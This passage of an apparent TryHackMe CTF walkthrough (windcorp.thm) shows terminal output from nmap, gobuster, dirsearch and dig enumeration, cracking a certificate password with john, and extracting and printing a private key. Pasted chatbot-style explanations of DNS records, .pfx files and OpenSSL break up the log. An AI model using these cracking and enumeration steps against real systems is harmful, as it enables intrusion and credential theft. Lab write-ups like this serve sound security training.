SF:0close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20
SF:character\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x2040
SF:0\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;cha
SF:rset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\
SF:n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20
SF:CNTL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Ty
SF:pe:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnect
SF:ion:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x
SF:20URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20charac
SF:ter\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
SF:ntent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x
SF:20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 51978/tcp): CLEAN (Timeout)
|   Check 2 (port 57361/tcp): CLEAN (Timeout)
|   Check 3 (port 58456/udp): CLEAN (Timeout)
|   Check 4 (port 10427/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-12-22T19:31:17
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.22 seconds

Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm

┌──(kali㉿kali)-[~/threader3000]
└─$ sudo nano /etc/hosts                
[sudo] password for kali: 
                                                                                             
┌──(kali㉿kali)-[~/threader3000]
└─$ cat /etc/hosts | grep "windcorp"
#10.10.132.73 windcorp.thm
10.10.219.166 fire.windcorp.thm
10.10.219.166 selfservice.windcorp.thm
10.10.219.166 selfservice.dev.windcorp.thm


┌──(kali㉿kali)-[~]
└─$ gobuster dir -u https://fire.windcorp.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://fire.windcorp.thm
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/22 14:52:52 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/img/]
/css                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/css/]
/vendor               (Status: 301) [Size: 156] [--> https://fire.windcorp.thm/vendor/]
/IMG                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/IMG/]
/*checkout*           (Status: 400) [Size: 3420]
/CSS                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/CSS/]
/Img                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/Img/]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
/http%3A              (Status: 400) [Size: 3420]
/q%26a                (Status: 400) [Size: 3420]
/**http%3a            (Status: 400) [Size: 3420]
/*http%3A             (Status: 400) [Size: 3420]
/powershell           (Status: 302) [Size: 165] [--> /powershell/default.aspx?ReturnUrl=%2fpowershell]                                                                                    
/**http%3A            (Status: 400) [Size: 3420]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3420]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3420]
/http%3A%2F%2Fblog    (Status: 400) [Size: 3420]
Progress: 72309 / 220561 (32.78%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2022/12/22 14:57:11 Finished
===============================================================

/powershell 

┌──(kali㉿kali)-[~]
└─$ gobuster dir -u https://selfservice.dev.windcorp.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://selfservice.dev.windcorp.thm
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/22 14:57:59 Starting gobuster in directory enumeration mode
===============================================================
/backup               (Status: 301) [Size: 167] [--> https://selfservice.dev.windcorp.thm/backup/]                                                                                        
/Backup               (Status: 301) [Size: 167] [--> https://selfservice.dev.windcorp.thm/Backup/]                                                                                        
/*checkout*           (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
Progress: 26439 / 220561 (11.99%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2022/12/22 14:59:36 Finished
===============================================================

/backup 

or using dirsearch

┌──(kali㉿kali)-[~/ra2]
└─$ dirsearch -u https://fire.windcorp.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -l -t 100 -x 400 

  _|. _ _  _  _  _ _|_    v0.4.2                                                             
 (_||| _) (/_(_|| (_| )                                                                      
                                                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/kali/.dirsearch/reports/fire.windcorp.thm/_22-12-22_15-05-55.txt

Error Log: /home/kali/.dirsearch/logs/errors-22-12-22_15-05-55.log

Target: https://fire.windcorp.thm/

[15:05:56] Starting: 
[15:05:59] 301 -  153B  - /img  ->  https://fire.windcorp.thm/img/         
[15:06:03] 301 -  153B  - /css  ->  https://fire.windcorp.thm/css/         
[15:06:12] 301 -  156B  - /vendor  ->  https://fire.windcorp.thm/vendor/   
[15:06:35] 301 -  153B  - /IMG  ->  https://fire.windcorp.thm/IMG/         
[15:07:15] 301 -  153B  - /CSS  ->  https://fire.windcorp.thm/CSS/         
[15:07:19] 301 -  153B  - /Img  ->  https://fire.windcorp.thm/Img/         
[15:14:00] 302 -  165B  - /powershell  ->  /powershell/default.aspx?ReturnUrl=%2fpowershell
CTRL+C detected: Pausing threads, please wait...                              
                                                                            
Canceled by the user

┌──(kali㉿kali)-[~/ra2]
└─$ dirsearch -u https://selfservice.dev.windcorp.thm -e -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -l -t 100 -x 400

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                       
 (_||| _) (/_(_|| (_| )                                                                                                                                                
                                                                                                                                                                       
Extensions: -w | HTTP method: GET | Threads: 30 | Wordlist size: 9009

Output File: /home/kali/.dirsearch/reports/selfservice.dev.windcorp.thm/_22-12-22_15-15-28.txt

Error Log: /home/kali/.dirsearch/logs/errors-22-12-22_15-15-28.log

Target: https://selfservice.dev.windcorp.thm/

[15:15:29] Starting: 
[15:15:31] 403 -  312B  - /%2e%2e//google.com                              
[15:15:47] 200 -  365B  - /Backup/                                          
[15:15:51] 403 -    2KB - /Trace.axd                                        
[15:15:54] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[15:16:08] 301 -  174B  - /aspnet_client  ->  https://selfservice.dev.windcorp.thm/aspnet_client/
[15:16:08] 403 -    1KB - /aspnet_client/                                   
[15:16:09] 301 -  167B  - /backup  ->  https://selfservice.dev.windcorp.thm/backup/
[15:16:10] 200 -  365B  - /backup/                                          
[15:16:31] 200 -  106B  - /index.html                                       
CTRL+C detected: Pausing threads, please wait...                              
                                                                              
Canceled by the user


┌──(kali㉿kali)-[~/ra2]
└─$ cp ../Downloads/cert.pfx cert.pfx
                                                                                             
┌──(kali㉿kali)-[~/ra2]
└─$ ls     
cert.pfx  PrintSpoofer.exe

Sure! I'd be happy to explain the basics of NS, MX, and TXT records.

An NS (name server) record is a type of resource record in the Domain Name System (DNS) that specifies which DNS server is responsible (i.e., authoritative) for a particular domain. The NS record indicates which DNS server is authoritative for the domain, allowing clients to resolve domain names to IP addresses.

An MX (mail exchange) record is a type of resource record in the DNS that specifies the server responsible for handling email for a particular domain. The MX record indicates the hostname and priority of the server responsible for handling email for the domain.

A TXT (text) record is a type of resource record in the DNS that allows administrators to include arbitrary text in a DNS record. TXT records are often used to hold information such as SPF (Sender Policy Framework) records and DKIM (DomainKeys Identified Mail) keys, which are used to verify the authenticity of email messages.

I hope this helps! Let me know if you have any other questions.


┌──(kali㉿kali)-[~/ra2]
└─$ dig windcorp.thm -t NS  @10.10.219.166

; <<>> DiG 9.18.8-1-Debian <<>> windcorp.thm -t NS @10.10.219.166
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52379
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;windcorp.thm.                  IN      NS

;; ANSWER SECTION:
windcorp.thm.           3600    IN      NS      fire.windcorp.thm.

;; ADDITIONAL SECTION:
fire.windcorp.thm.      3600    IN      A       10.10.219.166
fire.windcorp.thm.      3600    IN      A       192.168.112.1

;; Query time: 220 msec
;; SERVER: 10.10.219.166#53(10.10.219.166) (UDP)
;; WHEN: Thu Dec 22 15:22:59 EST 2022
;; MSG SIZE  rcvd: 92

┌──(kali㉿kali)-[~/ra2]
└─$ dig windcorp.thm -t MX  @10.10.219.166

; <<>> DiG 9.18.8-1-Debian <<>> windcorp.thm -t MX @10.10.219.166
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 51099
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;windcorp.thm.                  IN      MX

;; AUTHORITY SECTION:
windcorp.thm.           3600    IN      SOA     fire.windcorp.thm. hostmaster.windcorp.thm. 294 900 600 86400 3600

;; Query time: 240 msec
;; SERVER: 10.10.219.166#53(10.10.219.166) (UDP)
;; WHEN: Thu Dec 22 15:26:15 EST 2022
;; MSG SIZE  rcvd: 93

┌──(kali㉿kali)-[~/ra2]
└─$ dig windcorp.thm -t TXT  @10.10.219.166

; <<>> DiG 9.18.8-1-Debian <<>> windcorp.thm -t TXT @10.10.219.166
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 34387
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;windcorp.thm.                  IN      TXT

;; ANSWER SECTION:
windcorp.thm.           86400   IN      TXT     "THM{Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources}"

;; Query time: 208 msec
;; SERVER: 10.10.219.166#53(10.10.219.166) (UDP)
;; WHEN: Thu Dec 22 15:26:35 EST 2022
;; MSG SIZE  rcvd: 188

or

┌──(kali㉿kali)-[~/ra2]
└─$ dig windcorp.thm any @10.10.219.166

; <<>> DiG 9.18.8-1-Debian <<>> windcorp.thm any @10.10.219.166
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 61275
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;windcorp.thm.                  IN      ANY

;; ANSWER SECTION:
windcorp.thm.           600     IN      A       10.10.219.166
windcorp.thm.           3600    IN      NS      fire.windcorp.thm.
windcorp.thm.           3600    IN      SOA     fire.windcorp.thm. hostmaster.windcorp.thm. 294 900 600 86400 3600
windcorp.thm.           86400   IN      TXT     "THM{Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources}"

;; ADDITIONAL SECTION:
fire.windcorp.thm.      3600    IN      A       192.168.112.1
fire.windcorp.thm.      3600    IN      A       10.10.219.166

;; Query time: 208 msec
;; SERVER: 10.10.219.166#53(10.10.219.166) (TCP)
;; WHEN: Thu Dec 22 15:04:15 EST 2022
;; MSG SIZE  rcvd: 302

A .pfx file, also known as a PKCS#12 file, is a digital certificate file that contains both the public and private keys, as well as any associated certificate chains. It is typically used to store a certificate and its private key, and it is usually password-protected.

.pfx files are often used in conjunction with Secure Sockets Layer (SSL) or Transport Layer Security (TLS) to secure connections over the internet. They can be used to authenticate a server or client, as well as to encrypt and decrypt data transmitted between them.

I hope this helps! Let me know if you have any other questions.

┌──(kali㉿kali)-[~/ra2]
└─$ pfx2john cert.pfx > hash 
                                                                                             
┌──(kali㉿kali)-[~/ra2]
└─$ ls
cert.pfx  hash  PrintSpoofer.exe
                                                                                             
┌──(kali㉿kali)-[~/ra2]
└─$ more hash       
cert.pfx:$pfxng$256$32$2000$20$0014a87cf000ddc6d1a89ce90d03fb79b986eac7$30820a9c3082065206092
a864886f70d010701a08206430482063f3082063b30820637060b2a864886f70d010c0a0102a08205413082053d30...

┌──(kali㉿kali)-[~/ra2]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                     
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ganteng          (cert.pfx)     
1g 0:00:00:00 DONE (2022-12-22 15:29) 4.000g/s 8192p/s 8192c/s 8192C/s clover..lovers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

ganteng

OpenSSL is a free, open-source, software library that provides cryptographic functionality, including secure communication over networks using the Secure Sockets Layer (SSL) and Transport Layer Security (TLS) protocols. It is widely used to implement the underlying security for a variety of applications and protocols, such as HTTPS (Hypertext Transfer Protocol Secure), SSH (Secure Shell), and SSL/TLS VPNs (Virtual Private Networks).

OpenSSL is written in the C programming language and is available for a wide range of platforms, including Windows, Linux, and macOS. It provides a variety of cryptographic algorithms, including symmetric ciphers (e.g., AES and Blowfish), public-key algorithms (e.g., RSA and Elliptic Curve Cryptography), and hashing algorithms (e.g., SHA and MD5).

In addition to providing cryptographic functionality, OpenSSL also includes a number of command-line tools that can be used to perform various tasks, such as creating and managing SSL/TLS certificates, converting certificate formats, and debugging SSL/TLS connections.

I hope this helps! Let me know if you have any other questions.

┌──(kali㉿kali)-[~/ra2]
└─$ openssl -h                 
help:

Standard commands
asn1parse         ca                ciphers           cmp               
cms               crl               crl2pkcs7         dgst              
dhparam           dsa               dsaparam          ec                
ecparam           enc               engine            errstr            
fipsinstall       gendsa            genpkey           genrsa            
help              info              kdf               list              
mac               nseq              ocsp              passwd            
pkcs12            pkcs7             pkcs8             pkey              
pkeyparam         pkeyutl           prime             rand              
rehash            req               rsa               rsautl            
s_client          s_server          s_time            sess_id           
smime             speed             spkac             srp               
storeutl          ts                verify            version           
x509              

Message Digest commands (see the `dgst' command for more details)
blake2b512        blake2s256        md4               md5               
rmd160            sha1              sha224            sha256            
sha3-224          sha3-256          sha3-384          sha3-512          
sha384            sha512            sha512-224        sha512-256        
shake128          shake256          sm3               

Cipher commands (see the `enc' command for more details)
aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb       
aes-256-cbc       aes-256-ecb       aria-128-cbc      aria-128-cfb      
aria-128-cfb1     aria-128-cfb8     aria-128-ctr      aria-128-ecb      
aria-128-ofb      aria-192-cbc      aria-192-cfb      aria-192-cfb1     
aria-192-cfb8     aria-192-ctr      aria-192-ecb      aria-192-ofb      
aria-256-cbc      aria-256-cfb      aria-256-cfb1     aria-256-cfb8     
aria-256-ctr      aria-256-ecb      aria-256-ofb      base64            
bf                bf-cbc            bf-cfb            bf-ecb            
bf-ofb            camellia-128-cbc  camellia-128-ecb  camellia-192-cbc  
camellia-192-ecb  camellia-256-cbc  camellia-256-ecb  cast              
cast-cbc          cast5-cbc         cast5-cfb         cast5-ecb         
cast5-ofb         des               des-cbc           des-cfb           
des-ecb           des-ede           des-ede-cbc       des-ede-cfb       
des-ede-ofb       des-ede3          des-ede3-cbc      des-ede3-cfb      
des-ede3-ofb      des-ofb           des3              desx              
rc2               rc2-40-cbc        rc2-64-cbc        rc2-cbc           
rc2-cfb           rc2-ecb           rc2-ofb           rc4               
rc4-40            seed              seed-cbc          seed-cfb          
seed-ecb          seed-ofb          sm4-cbc           sm4-cfb           
sm4-ctr           sm4-ecb           sm4-ofb    


┌──(kali㉿kali)-[~/ra2]
└─$ openssl pkcs12 -in cert.pfx 
Enter Import Password:
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4b942170-a078-48b3-80cb-e73333376b73
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFLTBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQITyoMybcH0yMCAggA
MAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBAtRQXPmSg3rr9xHAwRDglPBIIE
0Nor4hr2/QiOwXhWV4/Sd6HhTrzFCbcZVWHjKS5k+5SYnsOdcDz4yd8kykPJq1i1
wT9jmD6Svd1SCaip6gDOXnqhKmTR4Ubc+FYPmednSdXBim5RuageTZIq7J3F31JW
PXnT6ZmjE7SR//7FWd6pUvHQ/uO1FGnDL/WK8JDmdweohhhjzj/TSzgZbAVo5NNk
gllwD9Ph3Gxwrx7FGkOeqYGlDpcWRTnTkY1huTrg3p9ATJVR44pOezHifbXKvIcg
q5Lo1SgZem85RFHyBez65hz1YXzZg+VsoSHLScR/BRBumVasMpNq2lsrvB2tcXC+
vUAwPDg/JPkqn5ihlIpsfqyhyQp4+9kTv5XOqqXNlWB3GoHIoRN/N5JFdhshbhjX
jZ8V3h7kOvrWHgHxm2ozZC0MWVx5+6RJpqZLnw9xuuGKPmNdPZePrZv+Yb+QCUvy
5w0tIMWL4vSJ4wASdG+HhCi7GTx9a9TVbBHMpgvgRiiEid8qb2ifdzwyNO2oQBNw
3nYI8GjlDhnZ+JQBeYF+Em05ohi8zymjvmhhG8o4Il9nS9xl2lk2zJNgADJ/qELq
cHrNIsDoYG5j6ddUx6UPVL2V/XC7pqcwfmSnjqL0HqHdWMd+MbfajjsEMSdFq2cf
sGNVo187cYFN+8QUs6gT/BLNMZIgOGJAr5k1EG7GbcQtbHOooxbUOTCOjSeRzImf
TBFNpcbF2kljaFWSMdAypHsJsMR4BbTqv8riq+thcSg2m5H60mjPTds+9+EUoEoM
1YZNw1ID4eRPPNtlKFwHoGWLQBEJLy3sSVjOF2N1FIkhZEeSM0wwdHHi67bQ3zUE
gkc6fb1olGGGhEtdAZgYD8xJvq3rtHz5b0RCcMukjnE0CbMyPay2pVKlCh88RB7s
Qq4MhroF1YmzgKOkRD+Jp7IJ7nVbbxzrjsfe0AkA/jjU2GmiU83XrX0pr3hOrGuH
qFM4ffa8sJQnRGYlZHKLxB2C1F6MjoWEyxpJpckn7NmRKV32TVPh59HV3Tvx/ssG
aPAp8ANQ59pUWnSYnw83lGdJRJQOU6p36bcX8b7KLs0oKWlWZDEA3uxYipZ5mwcW
6kSkcqqOIJUMdhwEiIvYU5QGTIonKVWUE5cQ8NMhPIX9ehbk/Bf7iqX/sFNClTCa
ug6ow4NsL9pCUNZKSFlo7fLuqPiDbS0YhO5yBrduUJpNrdVH0SHYM2nziJMK8/VD
+plILrhrVZYl14mhuCD40gbZYdSkzkjIORo72bAnPdrzV4wFKl/BhwU9smOhv5O/
/Yk5pgphqUlepyulDfeuDSF3e9fePpqUNB6qh/bf/9oSjNbUvVFt8UKoV0HQMGJl
YXwh7g9uf8Cgn+EgQKyoFSYrdlgTJPj92FbAIZoQ6aBHJ9yXmGDucLhISJpfobFF
JzeNYAaPcT7fc4uyh09S+W17NNfn8O5d1ZsR+kxbWpJM9X0vOLPGJCLmP79kESgX
1H2cu9ittv2zKl92oS2YH8KDvEFysFp6oBaNX8/YyQtSWtB5M0/vZXqseguOPppn
1bFkYmoVbLch1vjeoLsJCOf5VWX3K/7ZR5pLAIHOtkNcvC27wtt9WqPF20jyJfj3
vP6VSKYn4lGINY818S/a8J1lzb31zXxB7/Qa6UguQSdn
-----END ENCRYPTED PRIVATE KEY-----
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN = fire.windcorp.thm
issuer=CN = fire.windcorp.thm
-----BEGIN CERTIFICATE-----
MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
MTUqFyYKchFUeYlgf7k=
-----END CERTIFICATE-----

Now we can create a public and private key with openssl using `cert.pfx` and the password we cracked with john.

We need to extract the contents of the pfx to a certificate-file and a key-file.

┌──(kali㉿kali)-[~/ra2]
└─$ openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes
Enter Import Password:
                                                                                             
┌──(kali㉿kali)-[~/ra2]
└─$ ls
cert.pfx  hash  key.pem  PrintSpoofer.exe

┌──(kali㉿kali)-[~/ra2]
└─$ openssl pkcs12 -in cert.pfx -out crt.pem -clcerts -nokeys
Enter Import Password:
                                                                                             
┌──(kali㉿kali)-[~/ra2]
└─$ ls
cert.pfx  crt.pem  hash  key.pem  PrintSpoofer.exe

──(kali㉿kali)-[~/ra2]
└─$ more crt.pem 
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN = fire.windcorp.thm
issuer=CN = fire.windcorp.thm
-----BEGIN CERTIFICATE-----
MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
MTUqFyYKchFUeYlgf7k=
-----END CERTIFICATE-----

┌──(kali㉿kali)-[~/ra2]
└─$ more key.pem 
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4b942170-a078-48b3-80cb-e73333376b73
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC/3TRp/R/qfzQX
QnpT2MyBzBCujOuReaLTZ6xbVcCwelae64xAMg3oC2JiYNygURfP8214sjtPo+6y
pDpJeosG6tOdHxUic8PdB5rqXE5c2O416qpkoeFRpeLBJqq0AH4bM+Q216/DeN4S
P31JP8bWrBj1dx6x96pHYniRD7xTnIoskM8HE5LHf5IeMoSustOTrqWuUSLhq2v4
/9xxcDlMGRkWRiGLdh0pMOdh4/Z8yuq86qnDzZ6eIcAYnY3wkls16nzqmzyCIhGJ
4FRRyUX9YKnhzfeniLWKhXEkhgmPp/S2MaHL0bEHuXr061S61wgbT8WHEvZ1Dzoy
accfR0TtAgMBAAECggEBAJNKtlpHwKC9VrgkiNSlsxpSFtxpws7DmoTBKkhT5MGW
qbkHC3yc8KAbXUQ5KCbLGoTCVGA8M9xH9Y+fFEAkm2aMEDinDAqO5OZiWENi6aXN
w9IQfQ8UV23e891kWdgmKKmphKG1o3Fk8NcBdqUtGPDk3aRT9nSZtVdn+Tcj5Wgp
iHiwGnWtjZV2C4VS5J/PBdWyXNHB3qsJUiGUnOYkrCQJgTOllau5mp9S7DNbz/IY
ziMBjv4VkHJyt8rSBRV1lzN4Ypo+tVeO6MOfwbse6kAqjOx0VJz3ktpG6VQfTFs1
UtkPvys9yQAb8EcTn2cDLnLzkodZq4jxFqgdm2SvvOECgYEA4N79nnYWsojfBtuO
k6MUuMI1afgyzp6erWtSo//PCy/uTiUL6KLUS0l4u0Qoq2GbSHPmqCQJEcvjieAb
IGsnr+D1mX5Z9Kq9Q4uk274QCNXNt0k7M7+//rQxNJVw8LLXsZVqBR2OEWczAm/D
d/14eApAVk9ChPXDmlkGcDOHP5MCgYEA2myCMwUfNxiMbiNtTeHLQnuKzjD50E8O
4B8A4Qi45mxUSUR6NJZUCgC0KksJjd/qEPIHSxmotvOv7tW/XXxTXJnfuya49VbS
